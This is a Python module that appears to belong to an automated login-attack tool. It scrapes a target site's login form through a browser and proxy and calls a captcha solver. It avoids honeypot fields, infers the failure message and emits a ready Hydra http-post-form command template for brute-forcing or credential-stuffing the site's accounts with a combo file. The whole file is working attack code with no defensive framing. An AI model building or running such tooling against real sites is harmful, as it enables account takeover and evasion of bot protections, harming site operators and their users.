import re
from urllib.parse import urljoin, urlparse

try:
    from bs4 import BeautifulSoup

    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

from fetch import HAS_SELENIUM, fetch_page_playwright, fetch_page_selenium, solve_captcha
from helpers import normalize_and_validate_target, validate_url


def detect_failure_string(soup, url):
    error_keywords = ["incorrect", "invalid", "failed", "wrong", "error", "denied", "try again", "not found", "locked", "unsuccessful"]
    error_texts = []

    for tag in soup.find_all(["div", "span", "p", "label"], class_=re.compile(r"(error|alert|invalid|fail|warning|message|feedback)")):
        text = tag.get_text(strip=True).lower()
        if any(kw in text for kw in error_keywords):
            error_texts.append(text)

    form = soup.find("form")
    if form:
        form_text = form.get_text(strip=True).lower()
        for kw in error_keywords:
            if kw in form_text:
                error_texts.append(kw)

    if error_texts:
        unique_errors = list(set(error_texts))
        return f"F={'|'.join(unique_errors[:5])}"

    return "F=Invalid|wrong|failed|incorrect|error|denied|try again|not found"


def validate_login_form(form, html_content, strict=True):
    confidence = 0
    reasons = []

    method = form.get("method", "get").lower()
    if method != "post":
        if strict:
            return False, "method is not POST", 0
        confidence += 20
        reasons.append("non-POST method")

    action = form.get("action", "").strip()
    if action in ["#", "javascript:void(0)", "about:blank"]:
        if strict:
            return False, "invalid action URL", 0
        confidence += 10
        reasons.append("suspicious action URL")

    password_fields = form.find_all("input", {"type": "password"})
    if not password_fields:
        return False, "no password field found", 0

    confidence += 40

    user_fields = form.find_all("input", {"type": ["text", "email"]})
    if not user_fields:
        if strict:
            return False, "no username/email field found", 20
        confidence += 10
        reasons.append("no obvious username field")

    visible_inputs = [i for i in form.find_all("input") if i.get("type") not in ["hidden", "submit"]]
    if len(visible_inputs) < 2:
        if strict:
            return False, "too few visible input fields", 10
        confidence += 5
        reasons.append("few visible inputs")

    honeypot_keywords = ["honeypot", "email_confirm", "url", "website", "leaveblank"]
    for inp in form.find_all("input"):
        name = (inp.get("name") or "").lower()
        style = (inp.get("style") or "").lower()
        if any(kw in name for kw in honeypot_keywords) and ("display:none" in style or "visibility:hidden" in style):
            if strict:
                return False, "possible honeypot field detected", 0
            confidence -= 20
            reasons.append("honeypot suspicion")

    form_text = form.get_text(separator=" ", strip=True).lower()
    failure_keywords = ["incorrect", "invalid", "failed", "wrong", "error", "try again"]
    if any(kw in form_text for kw in failure_keywords):
        confidence += 20

    confidence = min(100, max(0, confidence))

    if confidence < 60 and strict:
        return False, f"low confidence ({confidence}): {', '.join(reasons)}", confidence

    return True, f"valid (confidence: {confidence})", confidence


def normalize_form_action(page_url, action):
    base_url = validate_url(page_url)
    if not base_url:
        return None

    raw_action = (action or "").strip()
    candidate = base_url if not raw_action else urljoin(base_url, raw_action)
    return validate_url(candidate)


def extract_login_form(url, proxy=None, strict_validation=True):
    if not HAS_BS4:
        return None, "bs4_not_installed"

    url, invalid_reason = normalize_and_validate_target(url)
    if not url:
        return None, {"status": "skipped_invalid_target", "reason": invalid_reason or "invalid target"}

    html, error = fetch_page_playwright(url, proxy)
    fallback_used = False

    if not html and HAS_SELENIUM:
        html, error = fetch_page_selenium(url, proxy)
        fallback_used = True

    if not html:
        if isinstance(error, dict):
            return None, {
                "status": "fetch_failed",
                "error_code": error.get("code") or "UNKNOWN_FETCH_ERROR",
                "error_message": error.get("message") or "fetch failed",
                "hint": error.get("hint") or "network or browser error",
            }
        return None, {"status": "fetch_failed", "error_code": "UNKNOWN_FETCH_ERROR", "error_message": str(error or "no_html")}

    soup = BeautifulSoup(html, "html.parser")

    captcha_token = solve_captcha(soup, url)
    if captcha_token:
        html, error = fetch_page_playwright(url, proxy)
        if html:
            soup = BeautifulSoup(html, "html.parser")

    forms = soup.find_all("form")

    best_form = None
    best_confidence = -1
    best_reason = ""

    for form in forms:
        is_valid, reason, confidence = validate_login_form(form, html, strict=strict_validation)

        if not is_valid:
            print(f"Skipped form at {url}: {reason}")
            continue

        if confidence > best_confidence:
            best_form = form
            best_confidence = confidence
            best_reason = reason

    if not best_form:
        return None, {"status": "no_form", "reason": f"no valid form (best confidence: {best_confidence})"}

    action = normalize_form_action(url, best_form.get("action"))
    if not action:
        return None, {"status": "no_form", "reason": "invalid action"}

    if best_form.get("method", "post").lower() != "post":
        return None, {"status": "no_form", "reason": "non-post form selected"}

    post_parts = []
    username_field = None

    for inp in best_form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        typ = inp.get("type", "text").lower()

        if typ == "password":
            post_parts.append(f"{name}=^PASS^")
        elif typ in ["text", "email"] and not username_field:
            username_field = name
            post_parts.append(f"{name}=^USER^")
        elif typ not in ["submit", "button", "hidden"]:
            post_parts.append(f"{name}=")

    for h in best_form.find_all("input", {"type": "hidden"}):
        n = h.get("name")
        v = h.get("value", "")
        if n:
            post_parts.append(f"{n}={v}")

    sub = best_form.find("input", {"type": "submit"})
    if sub:
        n = sub.get("name")
        v = sub.get("value", "Login")
        if n:
            post_parts.append(f"{n}={v}")

    if not username_field:
        username_field = "username" if "user" in str(best_form).lower() else "email"
        post_parts.append(f"{username_field}=^USER^")

    post_data = "&".join(post_parts)
    failure = detect_failure_string(soup, url)

    target = urlparse(url).netloc or url
    cmd_template = f'hydra -L "{{combo_file}}" -P "{{combo_file}}" {target} http-post-form "{action}:{post_data}:{failure}" -V -t 4 -f'

    return {
        "original_url": url,
        "action": action,
        "post_data": post_data,
        "failure_condition": failure,
        "hydra_command_template": cmd_template,
        "confidence": best_confidence,
        "validation_reason": best_reason,
        "fallback_used": fallback_used,
    }, None
